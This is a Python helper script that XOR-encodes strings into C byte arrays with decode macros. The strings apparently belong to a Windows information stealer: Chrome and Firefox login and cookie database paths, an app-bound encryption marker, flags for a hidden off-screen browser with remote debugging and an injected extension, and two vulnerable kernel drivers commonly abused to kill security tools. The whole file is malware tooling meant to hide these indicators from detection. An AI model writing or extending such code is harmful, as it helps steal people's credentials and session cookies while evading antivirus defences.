key = 0x5A
k = [key, key ^ 0x37, key ^ 0x91, key ^ 0xC5]
strings = {
    'ENC_DEFAULT_LOGIN':     'Default\\Login Data',
    'ENC_DEFAULT_LOGIN_J':   'Default\\Login Data-journal',
    'ENC_DEFAULT_COOKIES':   'Default\\Cookies',
    'ENC_DEFAULT_COOKIES_J': 'Default\\Cookies-journal',
    'ENC_SINGLETON_COOKIE':  'SingletonCookie',
    'ENC_V20_BLOCKED':       'v20_blocked',
    'ENC_LOGINS_JSON':       'logins.json',
    'ENC_REMOTE_DEBUG_PORT': '--remote-debugging-port=',
    'ENC_LOAD_EXTENSION':    '--load-extension=',
    'ENC_RTCORE64_SYS':      'RTCore64.sys',
    'ENC_DBUTIL_SYS':        'DBUtil_2_3.sys',
    'ENC_DISABLE_FEATURES':  '--disable-features=MediaRouter',
    'ENC_WINDOW_POS':        '--window-position=-32000,-32000',
    'ENC_WINDOW_SIZE':       '--window-size=800,600',
    'ENC_NO_DEFAULT_BROWSER':'--no-default-browser-check',
    'ENC_DISABLE_SYNC':      '--disable-sync',
    'ENC_DISABLE_BG_NET':    '--disable-background-networking',
    'ENC_USER_DATA_DIR':     '--user-data-dir=',
}
for name, s in strings.items():
    enc = [b ^ k[i%4] for i,b in enumerate(s.encode())]
    hex_arr = ','.join(f'0x{b:02x}' for b in enc)
    print(f'/* "{s}" */')
    print(f'static const BYTE {name}[] = {{{hex_arr}}};')
    print(f'#define DEC_{name[4:]}(buf) _xd(buf, {name}, {len(s)}, 0x5A)')
    print()
